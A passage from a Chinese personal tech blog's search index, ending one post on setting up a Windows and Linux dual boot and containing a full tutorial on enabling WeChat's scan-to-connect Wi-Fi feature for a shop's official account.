7只能将GPT转为MBR了，但这样会清空全盘数据，权衡之下，装Windows 10 LTSB吧，恰好之前封装过。重新将Windows分区格掉后开始安装，一切顺利，半小时后安装结束。双系统都能顺利进入和正常使用。</p><p>正当我为自己点赞时，开机发现竟然没有双系统选择延时，每次自动进入启动顺序的第一个系统，那这个问题怎么解决呢？再次查询后发现EasyBCD工具可以修复引导，使双系统开机出现选择按钮，不过呢，由于有其他事暂时没试，有空再搞，毕竟不是特别严重的问题。</p><hr><p>次日更<br>今天发现朋友的电脑开机竟然有了系统选择项，那我也就不用折腾了，这次系统的安装以完美收场，撒花～</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信连Wi-Fi使用教程</title>
      <link href="/post/wechat-wifi-tutorial/"/>
      <url>/post/wechat-wifi-tutorial/</url>
      
        <content type="html"><![CDATA[<p>如今，越来越多的商家开始支持免费Wi-Fi，很多顾客到店后都会询问Wi-Fi密码是多少</p><a id="more"></a>，有些打印的贴在墙上的还好，至少识别起来不是那么费劲，有些手写的就要多花一些时间才能连接成功。我就在想，有没有什么更加便捷的方式让用户一键连接？带着这个问题，我想到了如今无处不在的二维码，二维码中可以蕴藏链接、文本等信息，如果顾客能够扫描二维码直接连接岂不是更好？在一番查找后找到了联图网，该网站支持Wi-Fi格式的二维码，且对生成的二维码允许嵌入logo等自定义设置，增添一些趣味。尝试一番后以失败告终，这种方案的问题在于，手机的确可以读取出Wi-Fi名和密码，但结果是文本的形式，顾客还需复制粘贴才可以。然后就在想，现在越来越多的软件都有扫描二维码功能，那谁来做这个Wi-Fi一键连接是最佳人选呢？答案当然是老少咸宜的微信！于是又去进行查询，果然，微信已于2015年3月份在公众号推出了该功能，下面，我们就来看看如何开通和使用吧～<p>首先，你要有一个门面店（至少要让微信相信你有），然后你还要有一个微信公众号，还没有的商家快去注册一个吧，相信微信的注册引导已经很清楚了。<br>注册成功后，登录公众号后台，点击“添加功能插件”（如下图），然后点击“微信连Wi-Fi”，然后依此点击“开通”—&gt;“同意”服务协议—&gt;”返回”—&gt;“查看功能”。<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%85%AC%E4%BC%97%E5%8F%B7%E8%8F%9C%E5%8D%95.jpeg" alt="公众号菜单"></p><p><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8F%92%E4%BB%B6.jpeg" alt="公众号插件"></p><p>至此，微信连Wi-Fi开通成功，左侧功能新增“门店管理”和“微信连Wi-Fi”两个按钮。</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%B0%E5%A2%9E%E8%8F%9C%E5%8D%95.jpeg" alt="公众号新增菜单"></p><p>现在，我们点击“门店管理”，然后点击“新建门店”，之后填写门店的基本信息，完成后切换到“微信连Wi-Fi”，点击“设备管理”和“添加设备”，填写相关信息即可（注意此处的<font color=red>Wi-Fi名和密码至少要有一个是以大写的“WX”开头</font>）。然后将生成的二维码下载并粘贴在店内的醒目位置即可，顾客来了之后只需使用微信扫描该二维码即可一键连接Wi-Fi（扫描二维码时需联网，会<strong>消耗少量流量</strong>）。</p><p>公众号后台更可查看Wi-Fi在线人数以及历史趋势图，据此分析店铺的客流量，调整店铺的业务。更可向用户推送优惠券等促销内容。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信 </tag>
            
            <tag> wifi </tag>
            
            <tag> 公众号 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
